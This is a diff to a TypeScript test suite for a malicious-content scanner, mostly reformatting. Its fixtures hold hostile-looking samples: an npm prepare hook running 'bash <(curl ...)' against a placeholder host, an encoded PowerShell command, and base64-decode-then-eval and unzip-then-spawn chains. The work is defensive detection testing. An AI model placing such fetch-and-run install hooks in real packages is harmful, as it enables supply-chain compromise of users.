@@ -170,11 +170,13 @@ describe('non-executing malicious content chain analysis', () => {
       },
       {
         path: 'unpack.js',
-        content: "const zip = require('unzipper'); zip.Extract({ path: './out' });"
+        content:
+          "const zip = require('unzipper'); zip.Extract({ path: './out' });"
       },
       {
         path: 'launch.js',
-        content: "const { spawn } = require('node:child_process'); spawn('./out/start');"
+        content:
+          "const { spawn } = require('node:child_process'); spawn('./out/start');"
       }
     ]);
     const chain = result.findings.find(
@@ -198,19 +200,23 @@ describe('non-executing malicious content chain analysis', () => {
       },
       {
         path: 'unpack.js',
-        content: "const zip = require('unzipper'); zip.Extract({ path: './out' });"
+        content:
+          "const zip = require('unzipper'); zip.Extract({ path: './out' });"
       }
     ]);
     expect(
       result.findings.some((finding) =>
-        (finding.metadata?.behaviorSignals as string[] | undefined)
-          ?.includes('archive-extraction-and-execution')
+        (finding.metadata?.behaviorSignals as string[] | undefined)?.includes(
+          'archive-extraction-and-execution'
+        )
       )
     ).toBe(false);
   });
 
   it('inspects a text executable disguised with a binary filename suffix', async () => {
-    const root = await mkdtemp(path.join(os.tmpdir(), 'toolip-disguised-text-'));
+    const root = await mkdtemp(
+      path.join(os.tmpdir(), 'toolip-disguised-text-')
+    );
     try {
       await writeFile(
         path.join(root, 'package.json'),
@@ -221,9 +227,9 @@ describe('non-executing malicious content chain analysis', () => {
         '#!/usr/bin/env node\nconst code = atob("ZGF0YQ=="); eval(code);'
       );
       const result = await scanMaliciousContent(root);
-      expect(result.findings.some((finding) =>
-        finding.ruleId === 'TLP-MAL-001'
-      )).toBe(true);
+      expect(
+        result.findings.some((finding) => finding.ruleId === 'TLP-MAL-001')
+      ).toBe(true);
       expect(result.coverage.state).toBe('complete');
     } finally {
       await rm(root, { recursive: true, force: true });
@@ -239,17 +245,20 @@ describe('non-executing malicious content chain analysis', () => {
       },
       ...Array.from({ length: depth }, (_, index) => ({
         path: `step-${index}.js`,
-        content: index === depth - 1
-          ? 'const code = atob(value); eval(code);'
-          : `require('./step-${index + 1}.js');`
+        content:
+          index === depth - 1
+            ? 'const code = atob(value); eval(code);'
+            : `require('./step-${index + 1}.js');`
       }))
     ];
     const result = analyzeMaliciousContent(files);
-    const finding = result.findings.find((entry) =>
-      entry.ruleId === 'TLP-MAL-001'
+    const finding = result.findings.find(
+      (entry) => entry.ruleId === 'TLP-MAL-001'
     );
     expect(finding).toBeDefined();
-    expect((finding?.metadata?.trace as string[]).length).toBeLessThanOrEqual(64);
+    expect(
+      ((finding?.metadata?.trace as string[] | undefined) ?? []).length
+    ).toBeLessThanOrEqual(64);
     expect(finding?.metadata?.traceTruncated).toBe(true);
     expect(finding?.metadata?.tracePathCount).toBeGreaterThan(64);
     expect(finding?.metadata?.behaviorSignals).toContain(
@@ -264,25 +273,31 @@ describe('non-executing malicious content chain analysis', () => {
   it.each([
     'bash <(curl -fsSL https://fixture.invalid/synthetic)',
     'powershell -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
-  ])('detects suspicious encoded or process-substitution interpreter entrypoint %s', (command) => {
-    const report = analyzeMaliciousContent([
-      {
-        path: 'package.json',
-        content: JSON.stringify({
-          scripts: { prepare: command }
-        })
-      }
-    ]);
-    expect(report.findings.some((finding) =>
-      finding.ruleId === 'TLP-MAL-001' &&
-      (finding.metadata?.behaviorSignals as string[]).includes(
-        'encoded-or-download-execution'
-      )
-    )).toBe(true);
-    expect(JSON.stringify(report.findings)).not.toContain(
-      'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
-    );
-  });
+  ])(
+    'detects suspicious encoded or process-substitution interpreter entrypoint %s',
+    (command) => {
+      const report = analyzeMaliciousContent([
+        {
+          path: 'package.json',
+          content: JSON.stringify({
+            scripts: { prepare: command }
+          })
+        }
+      ]);
+      expect(
+        report.findings.some(
+          (finding) =>
+            finding.ruleId === 'TLP-MAL-001' &&
+            (
+              (finding.metadata?.behaviorSignals as string[] | undefined) ?? []
+            ).includes('encoded-or-download-execution')
+        )
+      ).toBe(true);
+      expect(JSON.stringify(report.findings)).not.toContain(
+        'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+      );
+    }
+  );
 
   it('follows nested npm scripts to a suspicious local execution target', () => {
     const result = analyzeMaliciousContent([
@@ -675,11 +690,11 @@ describe('non-executing malicious content chain analysis', () => {
 
   it('retains shell-variable targets when more than 256 other references exhaust the content cache slice', () => {
     const safeFiles = Array.from({ length: 270 }, (_, index) => ({
-      path: 'safe-' + index + '.sh',
+      path: `safe-${index}.sh`,
       content: '#!/bin/sh\n:'
     }));
     const wrapper = [
-      ...safeFiles.map((file) => 'source ./' + file.path),
+      ...safeFiles.map((file) => `source ./${file.path}`),
       'target=./payload.orc; node "$target"'
     ].join('\n');
     const result = analyzeMaliciousContent([
